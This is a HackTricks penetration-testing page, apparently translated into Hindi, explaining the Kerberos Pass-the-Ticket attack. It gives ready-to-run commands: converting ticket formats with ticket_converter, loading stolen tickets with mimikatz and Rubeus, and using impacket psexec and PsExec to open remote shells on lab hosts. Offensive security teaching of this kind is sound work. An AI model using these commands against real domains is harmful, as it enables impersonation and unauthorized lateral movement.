# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Pass The Ticket (PTT)

**Pass The Ticket (PTT)** हमले की विधि में, हमलावर **एक उपयोगकर्ता का प्रमाणीकरण टिकट चुराते हैं** बजाय उनके पासवर्ड या हैश मानों के। यह चुराया गया टिकट फिर **उपयोगकर्ता का अनुकरण करने** के लिए उपयोग किया जाता है, जिससे नेटवर्क के भीतर संसाधनों और सेवाओं तक अनधिकृत पहुंच प्राप्त होती है।

**पढ़ें**:

- [Windows से टिकट एकत्र करना](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Linux से टिकट एकत्र करना](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

### **प्लेटफार्मों के बीच Linux और Windows टिकटों का आदान-प्रदान**

[**ticket_converter**](https://github.com/Zer1t0/ticket_converter) उपकरण केवल टिकट और एक आउटपुट फ़ाइल का उपयोग करके टिकट प्रारूपों को परिवर्तित करता है।
```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
Converting ccache => kirbi

python ticket_converter.py velociraptor.kirbi velociraptor.ccache
Converting kirbi => ccache
```
Windows में [Kekeo](https://github.com/gentilkiwi/kekeo) का उपयोग किया जा सकता है।

### पास द टिकट अटैक
```bash:Linux
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```

```bash:Windows
#Load the ticket in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi
klist #List tickets in cache to cehck that mimikatz has loaded the ticket
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```
## संदर्भ

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{{#include ../../banners/hacktricks-training.md}}
